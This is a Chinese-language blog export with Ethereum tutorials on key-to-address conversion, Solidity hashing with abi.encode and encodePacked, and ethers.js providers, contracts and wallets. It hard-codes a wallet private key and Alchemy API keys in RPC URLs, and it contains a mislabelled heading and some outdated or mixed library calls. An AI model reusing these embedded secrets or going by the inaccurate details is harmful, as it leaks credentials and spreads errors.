签名原理","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"验证签名","slug":"验证签名","permalink":"https://biyouqiuqiu.com/tags/%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D/"},{"name":"ECDSA","slug":"ECDSA","permalink":"https://biyouqiuqiu.com/tags/ECDSA/"},{"name":"ethersjs","slug":"ethersjs","permalink":"https://biyouqiuqiu.com/tags/ethersjs/"}]},{"title":"以太坊 私钥公钥地址的转化","slug":"Solidity/Basic_Knowledge/私钥公钥地址的转化","date":"2023-05-18T06:47:10.000Z","updated":"2023-05-18T06:47:10.000Z","comments":true,"path":"2023/05/18/Solidity/Basic_Knowledge/私钥公钥地址的转化/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/18/Solidity/Basic_Knowledge/%E7%A7%81%E9%92%A5%E5%85%AC%E9%92%A5%E5%9C%B0%E5%9D%80%E7%9A%84%E8%BD%AC%E5%8C%96/","excerpt":"","text":"以太坊 私钥 &#x3D;》公钥 &amp;&amp; 公钥 &#x3D;》地址（JavaScript）1. 了解 ECDSA算法ECDSA链接1 ECDSA链接2 2. secp256k1曲线比特币和以太坊使用secp256k1定义的椭圆曲线 secp256k1曲线 3. 安装库123npm install ethereumjs-wallet --save或npm install ethereumjs-util --save 这两条命令任意执行一条即可 4. 从公钥获取私钥12345678910111213141516// import Wallet from &quot;ethereumjs-wallet&quot;;// import EthUtil from &quot;ethereumjs-util&quot;;// 因为当前的没指定模块，所以默认使用require语句导入包var Wallet = require(&#x27;ethereumjs-wallet&#x27;).default;var EthUtil = require(&#x27;ethereumjs-util&#x27;);// Get a wallet instance from a private key// privatekeyconst privateKey = &#x27;&#x27;;const privateKeyBuffer = EthUtil.toBuffer(privateKey);const wallet = Wallet.fromPrivateKey(privateKeyBuffer);// Get a public keyconst publicKey = wallet.getPublicKeyString(); console.log(`publicKey is =&gt; $&#123;publicKey&#125;`); 运行结果： 5. 获取以太坊的钱包地址5.1 方法一钱包地址的计算式： address = address(keccak256(publicKey)) solidity代码： 12345678contract publicKey &#123; // to compute the metamask publicKey function getPublicKey1(bytes _publickey) external pure returns (address _subPublickey) &#123; _subPublickey = address(keccak256(_publickey)); return _subPublickey; &#125; &#125; remix上的结果： genache上查看钱包地址： 5.3 方法二使用的是ethersjs中的 Waller钱包的publicKey属性获取钱包的公钥，但是获取公钥会在起始位置多出04这个数据段，我暂时还不知道是什么东西 代码： 123456789101112131415161718192021222324import &#123; ethers &#125; from &quot;ethers&quot;;// 获取本地的providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 根据私钥生成 singer对象const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet = new ethers.Wallet(privateKey,provider);// 选择一个私钥let testPK = privateKey;// 计算公钥// const publicKey = curve.keyFromPrivate(testPK).publicKey(&quot;hex&quot;);let publicKey = wallet.publicKey;// 0x607039d2266b689f20e030fdb0033824bcda33bce462ad2504e289f90df96381c363eb4bf5b2c080a56984bdcc8fbd6185053aec487a6fe988bfdef5eba1d55f// 0x04607039d2266b689f20e030fdb0033824bcda33bce462ad2504e289f90df96381c363eb4bf5b2c080a56984bdcc8fbd6185053aec487a6fe988bfdef5eba1d55f// let publicKey = &quot;0x04607039d2266b689f20e030fdb0033824bcda33bce462ad2504e289f90df96381c363eb4bf5b2c080a56984bdcc8fbd6185053aec487a6fe988bfdef5eba1d55f&quot;;let newKey = publicKey.substring(0,2) + publicKey.substring(4);console.log(`newKey = $&#123;newKey&#125;`); 运行结果： 参考链接1 参考链接2","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"验证签名","slug":"验证签名","permalink":"https://biyouqiuqiu.com/tags/%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D/"},{"name":"ECDSA","slug":"ECDSA","permalink":"https://biyouqiuqiu.com/tags/ECDSA/"},{"name":"ethereumjs","slug":"ethereumjs","permalink":"https://biyouqiuqiu.com/tags/ethereumjs/"}]},{"title":"hash篇","slug":"Solidity/Basic_Knowledge/hash篇","date":"2023-05-18T02:47:10.000Z","updated":"2023-05-18T02:47:10.000Z","comments":true,"path":"2023/05/18/Solidity/Basic_Knowledge/hash篇/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/18/Solidity/Basic_Knowledge/hash%E7%AF%87/","excerpt":"","text":"hash 篇 abi.encodePacked 函数将其参数按顺序拼接起来，不添加任何类型标识符或分隔符，并返回一个紧凑的字节数组，不包含长度信息。这种编码方式适用于构造哈希值和签名的情况，因为它生成的字节数组不受字节对齐的影响。 abi.encode 函数则将其参数编码为包含类型标识符和长度信息的字节数组，并返回一个动态字节数组，它包含了参数所需的所有信息。这种编码方式适用于在 Solidity 智能合约中调用其他合约函数的情况，因为它生成的字节数组可以被正确地解码为对应的参数类型。 js代码12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455import &#123; ethers &#125; from &quot;ethers&quot;;import fs from &quot;fs&quot;;// 获取本地的providerconst provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 读取文件的abiconst ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\ethersjsWorkspace\\\\LearningSelf\\\\test\\\\day04\\\\getHash.abi&quot;).toString());// 通过ABI获取接口类const infe = new ethers.utils.Interface(ABI);// 获取函数选择器const getHashByAddress = infe.getSighash(&quot;getHashByAddress&quot;);console.log(`getHashByAddress is =&gt; $&#123;getHashByAddress&#125;`);/** * ethersjs 中的 ethers.utils.AbiCoder() &lt;=&gt; 相当于 solidity中的 abi.encode() * */ const abiCoder = new ethers.utils.AbiCoder();// 创建消息let msg1 = &quot;getHashByAddress&quot;;let msg1Hash = abiCoder.encode( [&#x27;string&#x27;], [msg1])let hash = ethers.utils.keccak256(msg1Hash);console.log(`hash is =&gt; $&#123;hash&#125;`);// 创建消息const msg = &quot;getHashByAddress&quot;;// 等效于Solidity中的keccak256(abi.encodePacked())const msgHash1 = ethers.utils.solidityKeccak256( [&#x27;string&#x27;], [msg])console.log(`msgHash: $&#123;msgHash1&#125;`)// msgHash：0x1bf2c0ce4546651a1a2feb457b39d891a6b83931cc2454434f39961345ac378c// 先对 msg 进行打包 const msgHash2 = ethers.utils.solidityPack( [&#x27;string&#x27;], [msg])// 这两步等效于 `solidityPack()`const hash1 = ethers.utils.keccak256(msgHash2);console.log(`msgHash2: $&#123;msgHash2&#125;`);console.log(`hash1 is: $&#123;hash1&#125;`); solidity 合约123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract getHash &#123; constructor() &#123; &#125; function getHashByAddress(address _address) external pure returns(bytes32) &#123; bytes32 result = keccak256(abi.encodePacked(_address)); return result; &#125; function getHashByString1(string memory _str) external pure returns(bytes32) &#123; // abi.encodePacked(_str); // bytes32 result = keccak256(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encode(_str)); bytes32 result = keccak256(abi.encode(_str)); return result; &#125; function getHashByString2(string memory _str) external pure returns(bytes32) &#123; // bytes32 str = bytes32(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encodePacked(_str)); bytes32 result = keccak256(abi.encodeWithSignature(_str)); // bytes32 result = keccak256(abi.encode(str)); return result; &#125; function getHashByString3(string memory _str) external pure returns(bytes32) &#123; // bytes32 str = bytes32(abi.encodePacked(_str)); bytes32 result = keccak256(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encode(_str)); // bytes32 result = keccak256(abi.encode(str)); return result; &#125; function getHashByString4(string memory _str) external pure returns(bytes32) &#123; // bytes32 str = bytes32(abi.encodePacked(_str)); bytes32 result = sha256(abi.encodePacked(_str)); // bytes32 result = keccak256(abi.encode(_str)); // bytes32 result = keccak256(abi.encode(str)); return result; &#125; function getEncode(string memory _str) external pure returns(bytes memory result) &#123; result = abi.encode(_str); // return ; &#125; function getEncodePacked(string memory _str) external pure returns(bytes memory result) &#123; result = abi.encodePacked(_str); // return ; &#125; &#125; abi文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140[ &#123; &quot;inputs&quot;: [], &quot;stateMutability&quot;: &quot;nonpayable&quot;, &quot;type&quot;: &quot;constructor&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getEncode&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes&quot;, &quot;name&quot;: &quot;result&quot;, &quot;type&quot;: &quot;bytes&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getEncodePacked&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes&quot;, &quot;name&quot;: &quot;result&quot;, &quot;type&quot;: &quot;bytes&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;address&quot;, &quot;name&quot;: &quot;_address&quot;, &quot;type&quot;: &quot;address&quot; &#125; ], &quot;name&quot;: &quot;getHashByAddress&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString1&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString2&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString3&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;, &#123; &quot;inputs&quot;: [ &#123; &quot;internalType&quot;: &quot;string&quot;, &quot;name&quot;: &quot;_str&quot;, &quot;type&quot;: &quot;string&quot; &#125; ], &quot;name&quot;: &quot;getHashByString4&quot;, &quot;outputs&quot;: [ &#123; &quot;internalType&quot;: &quot;bytes32&quot;, &quot;name&quot;: &quot;&quot;, &quot;type&quot;: &quot;bytes32&quot; &#125; ], &quot;stateMutability&quot;: &quot;pure&quot;, &quot;type&quot;: &quot;function&quot; &#125;] remix上的结果： vscode的结果：","categories":[{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/categories/Solidity/"},{"name":"Basic_Knowledge","slug":"Solidity/Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Solidity/Basic-Knowledge/"},{"name":"Utils","slug":"Solidity/Utils","permalink":"https://biyouqiuqiu.com/categories/Solidity/Utils/"}],"tags":[{"name":"abi.encode","slug":"abi-encode","permalink":"https://biyouqiuqiu.com/tags/abi-encode/"},{"name":"abi.encodePacked","slug":"abi-encodePacked","permalink":"https://biyouqiuqiu.com/tags/abi-encodePacked/"},{"name":"solidityKeccak256","slug":"solidityKeccak256","permalink":"https://biyouqiuqiu.com/tags/solidityKeccak256/"},{"name":"abiCoder.encode","slug":"abiCoder-encode","permalink":"https://biyouqiuqiu.com/tags/abiCoder-encode/"},{"name":"hash","slug":"hash","permalink":"https://biyouqiuqiu.com/tags/hash/"}]},{"title":"ethersjs_self","slug":"Ethersjs/Basic_Knowledge/ethersjs_self","date":"2023-05-12T02:47:10.000Z","updated":"2023-05-12T02:47:10.000Z","comments":true,"path":"2023/05/12/Ethersjs/Basic_Knowledge/ethersjs_self/","link":"","permalink":"https://biyouqiuqiu.com/2023/05/12/Ethersjs/Basic_Knowledge/ethersjs_self/","excerpt":"","text":"ethers.js_day011. ethers.js的安装 参考文档 在终端执行命令： 1npm install --save ethers 出现的问题: a. 按照 B站教程来的话，需要修改package.js中的配置，如： 123456&#123; &quot;type&quot;: &quot;module&quot;, &quot;dependencies&quot;: &#123; &quot;ethers&quot;: &quot;^5.6.9&quot; &#125;&#125; 在这里：加入了 &#39;&#39;type&quot;: &quot;module&quot;之后，require()这种引包的方式就不能使用了，网上搜了一下说是 ES6模块（没系统学过JavaScript，不是很懂，只是记录一下，避免继续犯错），得需要使用 import的方式导入 ethers包 1const &#123; ethers &#125; = require(&quot;ethers&quot;); 1import &#123; ethers &#125; from &quot;ethers&quot;; b. B站视频中在vscode上安装的ethers包的命令为： 1npm install ethers@5.6.9 这行代码会让代码无法运行，报错如下： 2. 编写 Hello Vitalik2.1 编译器： 在线编译器 —– playcode 本地编译器 —– VSCode 2.2 第一段代码 示例代码： 1234567import &#123; ethers &#125; from &quot;ethers&quot;;const provider = ethers.getDefaultProvider();const main = async () =&gt; &#123; const balance = await provider.getBalance(`vitalik.eth`); console.log(`ETH Balance of vitalik: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;main() 解读代码 1234const main = async () =&gt; &#123; const balance = await provider.getBalance(`vitalik.eth`); console.log(`ETH Balance of vitalik: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125; 代码的意思： 这是一段使用 JavaScript 编写的代码，使用了 ethers.js 库与以太坊节点进行交互。 这段代码定义了一个异步函数 main()，在函数中： 使用 provider.getBalance() 函数获取 vitalik.eth 地址上的以太币余额，并将结果存储在 balance 变量中。这里的 provider 是一个 ethers.js 库中提供的以太坊节点对象，它用于与以太坊网络进行通信。 使用 ethers.utils.formatEther() 函数将以太币余额从 wei 单位转换为以太币单位，并将结果打印到控制台中。 因为 getBalance() 函数是异步函数，它会从以太坊网络中读取数据，因此需要使用 await 关键字等待它完成读取操作。在等待 getBalance() 函数完成后，balance 变量将包含返回的余额值，可以对其进行处理并打印到控制台中。 ethers.js_day023. Provider 提供器3.1 运行如下代码报错：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// 导入ethers包import &#123; ethers &#125; from &quot;ethers&quot;;// playcode免费版不能安装ethers，用这条命令，需要从网络上import包（把上面这行注释掉）// import &#123; ethers &#125; from &quot;https://cdn-cors.ethers.io/lib/ethers-5.6.9.esm.min.js&quot;;// 利用Alchemy的rpc节点连接以太坊网络// 准备 alchemy API 可以参考https://github.com/AmazingAng/WTFSolidity/blob/main/Topics/Tools/TOOL04_Alchemy/readme.md const ALCHEMY_MAINNET_URL = &#x27;https://eth-mainnet.g.alchemy.com/v2/oKmOQKbneVkxgHZfibs-iFhIlIAl6HDN&#x27;;const ALCHEMY_GOERLI_URL = &#x27;https://eth-goerli.alchemyapi.io/v2/GlaeWuylnNM3uuOo-SAwJxuwTdqHaY5l&#x27;;// 连接以太坊主网const providerETH = new ethers.JsonRpcProvider(ALCHEMY_MAINNET_URL)// 连接Goerli测试网const providerGoerli = new ethers.JsonRpcProvider(ALCHEMY_GOERLI_URL)const main = async () =&gt; &#123; // 利用provider读取链上信息 // 1. 查询vitalik在主网和Goerli测试网的ETH余额 console.log(&quot;1. 查询vitalik在主网和Goerli测试网的ETH余额&quot;); const balance = await providerETH.getBalance(`vitalik.eth`); const balanceGoerli = await providerGoerli.getBalance(`vitalik.eth`); // 将余额输出在console（主网） console.log(`ETH Balance of vitalik: $&#123;ethers.formatEther(balance)&#125; ETH`); // 输出Goerli测试网ETH余额 console.log(`Goerli ETH Balance of vitalik: $&#123;ethers.formatEther(balanceGoerli)&#125; ETH`); // 2. 查询provider连接到了哪条链 console.log(&quot;\\n2. 查询provider连接到了哪条链&quot;) const network = await providerETH.getNetwork(); console.log(network.toJSON()); // 3. 查询区块高度 console.log(&quot;\\n3. 查询区块高度&quot;) const blockNumber = await providerETH.getBlockNumber(); console.log(blockNumber); // 4. 查询 vitalik 钱包历史交易次数 console.log(&quot;\\n4. 查询 vitalik 钱包历史交易次数&quot;) const txCount = await providerETH.getTransactionCount(&quot;vitalik.eth&quot;); console.log(txCount); // 5. 查询当前建议的gas设置 console.log(&quot;\\n5. 查询当前建议的gas设置&quot;) const feeData = await providerETH.getFeeData(); console.log(feeData); // 6. 查询区块信息 console.log(&quot;\\n6. 查询区块信息&quot;) const block = await providerETH.getBlock(0); console.log(block); // 7. 给定合约地址查询合约bytecode，例子用的WETH地址 console.log(&quot;\\n7. 给定合约地址查询合约bytecode，例子用的WETH地址&quot;) const code = await providerETH.getCode(&quot;0xc778417e063141139fce010982780140aa0cd5ab&quot;); console.log(code);&#125;main() 报错结果如下： 报错原因是说 JsonRpcProvider 不是一个构造器，到官方文档上查看，JsonRpcProvider的用法是： 1234// 连接以太坊主网const providerETH = new ethers.providers.JsonRpcProvider(ALCHEMY_MAINNET_URL)// 连接Goerli测试网const providerGoerli = new ethers.providers.JsonRpcProvider(ALCHEMY_GOERLI_URL) RPC的连接 3.2 与本地的ganache获取连接 代码： 123456789import &#123; ethers &#125; from &quot;ethers&quot;;const provider = ethers.getDefaultProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 我设置的端口号为8545const address = &#x27;&#x27;; // 替换为需要查询余额的账户地址provider.getBalance(address).then((balance) =&gt; &#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;).catch((err) =&gt; &#123; console.error(&#x27;Error:&#x27;, err);&#125;); ​ 3.3 与 metamask（小狐狸🦊钱包）建立连接 3.3.1 需要到 Alchemy 上获取RPC 的节点 12345678const provider = ethers.getDefaultProvider(&quot;&quot;); // 从Alchemy获取const address = &#x27;&#x27;; // 替换为需要查询余额的账户地址provider.getBalance(address).then((balance) =&gt; &#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;).catch((err) =&gt; &#123; console.error(&#x27;Error:&#x27;, err);&#125;); 3.4 利用Provider读取链上数据tips：const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;); 这个的连接速度要比const provider = ethers.getDefaultProvider(&quot;HTTP://127.0.0.1:8545&quot;);的连接速度更快 3.5 获取指定地址的余额 – provider.getBalance(address) 代码： 12345&gt;provider.getBalance(address).then((balance) =&gt; &#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&gt;&#125;).catch((err) =&gt; &#123; console.error(&#x27;Error:&#x27;, err);&gt;&#125;); 解释： 这段代码是使用以太坊 JavaScript 库 Ethers.js 来查询指定以太坊地址的余额，并将其以以太币（ETH）的形式打印到控制台上。 具体来说，这段代码执行了以下步骤： 调用 provider.getBalance(address) 方法，其中 provider 是一个以太坊节点提供商，address 是要查询的以太坊地址。 getBalance() 方法返回一个 Promise，该 Promise 在查询完成后返回以太坊地址的余额。 当 Promise 被解析时，then() 方法中的回调函数会被执行。该回调函数使用 ethers.utils.formatEther() 方法将余额从 wei 转换为以太，并将结果打印到控制台上。 如果 Promise 被拒绝（即查询失败），则 catch() 方法中的回调函数会被执行，该回调函数将错误信息打印到控制台上 3.6 查询provider连接到那条链 – provider.getNetwork() 代码： 1const netWork = await provider.getNetwork(); 查询结果： 3.7 查询当前 gas price — provider.getGasPrice() tips:返回的数据格式为BigNumber，可以用BigNumber类的toNumber()或toString() 方法转换成数字或者字符串 代码： 12&gt;const gas_price = await provider.getGasPrice();&gt;console.log(gas_price.toString()); 运行结果： 3.8 查询区块信息 – provider.getBlock() 代码： 1const block = await provider.getBlock(2); 查询结果： 3.9 查询地址的合约bytecode — provider.getCode(address) 代码： 12const address = &quot;0x44f2A5d2CFf45111E5FdcBE600CfA62Ea0386E7f&quot;; //合约地址const code = await providerETH.getCode(address); 查询结果： 4.读取合约信息4.1 创建Contract变量4.1.1 只读Contract tips：参数分别是合约地址，合约的abi和provider变量（只读） 代码： 1const contract = new ethers.Contract(`address`,`abi`,`provider`) 4.1.2 可读写 Contract tips: 参数分别是合约地址，合约的abi和singer变量。Singer签名者是ethers中另一个类，用于签名交易。 代码： 1const contract = new ethers.Contract(`address`, `abi`, `signer`); 4.2 创建只读 Contract实例tips：创建Contract实例需要填入三个参数，分别是合约地址，合约abi和provider变量。 tips:ehters支持两种abi填法 方法一：直接输出合约的abi。也可以像之前web3中那样使用 fs包读取 .abi文件，我觉得这种可读性更强一些。 1234var fs = require(&quot;fs&quot;);var path = &quot;&quot;;//这里是你本地abi的文件地址var contractABI = JSON.parse(fs.readFileSync(path),toString()); 参考代码： 123456789101112131415// SPDX-License-Identifier: MITpragma solidity ^0.4.21;contract CallMeChallenge &#123; int public value = 5; bool public isComplete = false; function callme() public &#123; isComplete = true; &#125; function getValue() external view returns(int) &#123; return value; &#125;&#125; 12345678910111213141516171819202122232425262728293031323334import &#123; Contract, ethers &#125; from &quot;ethers&quot;; // ES6模块下引入ethers包// var fs = require(&quot;fs&quot;)import fs from &quot;fs&quot;; // ES6模块下引入fs包const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 读取文件的abilet con_ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\ethersjsWorkspace\\\\LearningSelf\\\\abi\\\\CallMeChallenge.abi&quot;).toString())// 合约地址let con_Address = &quot;0xCfD32B1C6C1b2Fb425F3d6a86F8E2ebB363b5d96&quot;;// 创建合约let contract = new ethers.Contract(con_Address,con_ABI,provider);async function main() &#123; let slot0 = await provider.getStorageAt(con_Address,0); console.log(&quot;slot0 = &gt;&quot; + slot0); let slot1 = await provider.getStorageAt(con_Address,0); console.log(&quot;slot1 = &gt;&quot; + slot1);&#125; // 调用函数main()// 调用合约的只读函数let value = await contract.getValue();console.log(&quot;value =&gt; &quot; + value);let address = &quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;;provider.getBalance(address).then((balance)=&gt;&#123; console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);&#125;) 运行结果： 注: 在Solidity中，布尔类型(bool)的默认值是false。在你的智能合约中，存储槽(slot)的位置为0，存储的变量是布尔类型(isComplete)，因此默认值为false。 当你部署合约时，存储槽的初始值会被设置为false。如果在之后合约的执行过程中，调用了callme()函数，isComplete变量的值会被设置为true，存储槽的值也会相应地被更新为true。 在使用ethers查询存储槽的值时，如果存储槽的值为false，查询结果会显示为0x0。如果存储槽的值为true，查询结果会显示为0x1。 因此，如果你在查询智能合约的存储槽时得到的结果是0x0，这意味着存储槽的值为false，即isComplete变量还没有被设置为true。如果你想要获取存储槽的实际值，可以将查询结果转换为布尔类型，如下所示: 123const slot0 = await provider.getStorageAt(contractAddress, 0);const isComplete = ethers.utils.bigNumberify(slot0).toNumber() !== 0;console.log(`isComplete: $&#123;isComplete&#125;`); 这段代码将查询结果转换为BigNumber类型，并将其转换为数字类型。如果数字不为0，isComplete变量的值为true，否则为false。 方法二：由于abi可读性太差，ethers创新的引入了人类可读ABI。开发者可以通过function signature和event signature来写ABI。 参考代码： 123456789101112131415161718192021222324252627import &#123; Contract, ethers &#125; from &quot;ethers&quot;; // ES6模块下引入ethers包// var fs = require(&quot;fs&quot;)import fs from &quot;fs&quot;; // ES6模块下引入fs包const provider = new ethers.providers.JsonRpcProvider(&quot;HTTP://127.0.0.1:8545&quot;);// 读取文件的abilet con_ABI = JSON.parse(fs.readFileSync(&quot;D:\\\\VSCode\\\\VSCode_Data\\\\ethersjsWorkspace\\\\LearningSelf\\\\abi\\\\CallMeChallenge.abi&quot;).toString())// 合约地址let con_Address = &quot;0xCfD32B1C6C1b2Fb425F3d6a86F8E2ebB363b5d96&quot;;// 创建合约let contract = new ethers.Contract(con_Address,con_ABI,provider);let abi = [ &quot;function callme() public&quot;, &quot;function getValue() external view returns(int)&quot;,]let contract1 = new ethers.Contract(con_Address,abi,provider);async function demo1()&#123; // 调用合约的只读函数 let value = await contract1.getValue(); console.log(&quot;demo1&#x27;s value =&gt; &quot; + value);&#125;demo1() 运行结果： 4.3 更多的读取合约信息可到 官方文档 查看5.发送ETH5.1 Signer签名类在ethers中，Signer签名者类是以太坊账户的抽象类，可用于对消息和交易进行签名，并将签名的交易发送到以太坊网络，并更改区块链状态。Signer类是抽象类，不能直接实例化，我们需要使用它的子类：Wallet钱包类。 5.2 Wallet钱包类Wallet类继承了Signe类，并且开发者可以像包含私钥的外部拥有者账户（EOA）一样，用它对交易和消息进行签名。 5.2.1方法一：创建随机的wallet对象我们可以使用 ethers.Wallet.createRandom()函数创建带有随机私钥的Wallet对象。对该私钥由加密安全的熵源生成，如果当前环境没有安全的熵源，则会引发错误。 tips：在密码学中，熵（entropy）是指随机性的度量。在智能合约中，熵源（entropy source）是指用于生成随机数或随机种子的源头。 在智能合约中，为了确保随机数的安全性和不可预测性，需要使用熵源来生成随机数或随机种子。通常情况下，熵源可以是外部的数据源，例如区块哈希或者时间戳等，也可以是合约内部的数据源，例如合约的存储槽或者合约的执行结果等。 需要注意的是，熵源的质量和安全性对于密码学应用非常重要。如果熵源不够随机或者不够安全，可能会导致随机数的可预测性，从而破坏密码学应用的安全性。因此，在使用熵源生成随机数或随机种子时，需要选择合适的熵源，并对其进行充分的测试和验证，以确保其安全性和不可预测性。 12// 创建随机的wallet对象const wallet1 = new ethers.Wallet.createRandom() 5.2.2方法二：用私钥创建wallet对象我们已知私钥的情况下，可以利用ethers.Wallet() 函数创建 Wallet对象。 从Ganache中获取privateKey 123// 利用私钥和provider创建wallet对象const privateKey = &#x27;&#x27; // 填入你的私钥const wallet2 = new ethers.Wallet(privateKey, provider) 5.2.3方法三：从助记词创建wallet对象我们已知助记词的情况下，可以利用 ethers.Wallet.fromMnemonic() 函数创建Wallet对象。 12// 从助记词创建wallet对象const wallet3 = new ethers.Wallet.fromMnemonic(mnemonic.phrase) 5.2.4 其他方法：通过JSON文件创建wallet对象通过ethers.Wallet.fromEncryptedJson解密一个JSON钱包文件创建钱包实例，JSON文件即keystore文件，通常来自Geth, Parity等钱包 5.3 发送ETH我们可以利用Wallet实例来发送ETH。首先，我们需要构造一个交易请求，在里面声明接收地址to和发送的ETH数额value。交易请求TransactionRequest类型可以包含发送方 from，nonce值 nounce，请求数据data等信息。 12345// 创建交易请求，参数：to为接收地址，value为ETH数额const tx = &#123; to: address1, value: ethers.utils.parseEther(&quot;0.001&quot;)&#125; 然后，我们就可以利用Wallet类的sendTransaction来发送交易，等待交易上链，并获得交易的数据。 1234//发送交易，获得收据const receipt = await wallet2.sendTransaction(tx)await receipt.wait() // 等待链上确认交易console.log(receipt) // 打印交易详情 5.4 代码实例5.4.1创建Wallet实例三种方法的示例代码： 1234567891011121314151617181920212223242526272829303132333435363738import &#123; ethers &#125; from &quot;ethers&quot;;const netWork = &quot;HTTP://127.0.0.1:8545&quot;;const provider = new ethers.providers.JsonRpcProvider(netWork);// let balance = await provider.getBalance(&quot;0xfDc84b042c01F01C7cC6eF08452BA156844c3A5C&quot;);// console.log(`Account balance: $&#123;ethers.utils.formatEther(balance)&#125; ETH`);/** 方法一：创建随机私钥的Wallet对象。 这种方法创建的钱包是单机的，我们需要用connect(provider)函数，连接到以太坊节点。这种方法创建的钱包可以用mnemonic获取助记词 */const wallet1 = ethers.Wallet.createRandom();console.log(&quot;wallet1 =&gt;\\n&quot;,wallet1);const wallet1WithProvider = wallet1.connect(provider);const mnemonic = wallet1.mnemonic;console.log(&quot;助记词：\\n&quot; , mnemonic);/** * 方法二：利用私钥和provider实例创建Wallet对象 * 这种方法不能获取助记词 */const privateKey = &quot;0x9b139483dc6f6c8782fda2301e9b65a75b3d084d79e79e04c64683bebfa1741d&quot;;const wallet2 = new ethers.Wallet(privateKey, provider);console.log(&quot;wallet2 =&gt;\\n&quot;,wallet2);/** * 方法三：利用助记词创建Wallet对象 */// 从助记词创建wallet对象const wallet3 = ethers.Wallet.fromMnemonic(mnemonic.phrase);console.log(&quot;wallet3 =&gt; &quot;,wallet3); 运行结果： 